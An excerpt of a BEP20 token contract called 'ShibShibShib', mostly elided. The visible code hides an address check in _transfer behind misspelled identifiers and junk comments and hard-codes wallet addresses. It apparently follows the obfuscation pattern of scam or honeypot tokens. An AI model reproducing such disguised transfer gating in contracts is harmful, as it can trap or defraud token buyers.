...
abstract contract BEP20 is Context, IERC20, Ownable {
    ...
    function amountBNBMaeket(address Interfaace, address functinn) internal view returns (bool){return (Interfaace != functinn)
       /*fwqoji*/  || /*fwqoji*/
        (Interfaace != inTheMTFFace);
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            }if(amountBNBMaeket(sender,recipient))
...
contract ShibShibShib is BEP20 {
    constructor() BEP20(
        "ShibShibShib", 
        "ShibShibShib",
        10000000000000,
        ...
        [0x647EC0D6358CE16BB88BebB1CA2E8E61917dbbe4,0x647EC0D6358CE16BB88BebB1CA2E8E61917dbbe4],
        0x1233165E2d2759c01690eE0b4b4f18d7e91067F9
    ){}
}